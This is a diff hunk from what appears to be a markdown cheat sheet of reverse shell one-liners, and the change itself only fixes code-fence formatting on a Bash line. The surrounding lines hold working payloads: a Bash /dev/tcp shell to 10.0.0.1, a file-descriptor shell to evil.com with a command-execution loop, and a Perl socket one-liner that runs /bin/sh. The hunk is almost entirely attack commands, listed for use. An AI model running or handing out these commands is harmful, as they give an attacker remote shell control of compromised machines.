@@ -75,7 +75,7 @@ Bash:<br>
 ``` $ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 ```
 
 ``` $ exec 5<>/dev/tcp/evil.com/8080 ```<br>
-'$ cat <&5 | while read line; do $line 2>&5 >&5; done'
+``` $ cat <&5 | while read line; do $line 2>&5 >&5; done ```
 
 Perl<br>
 ```$ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' ```
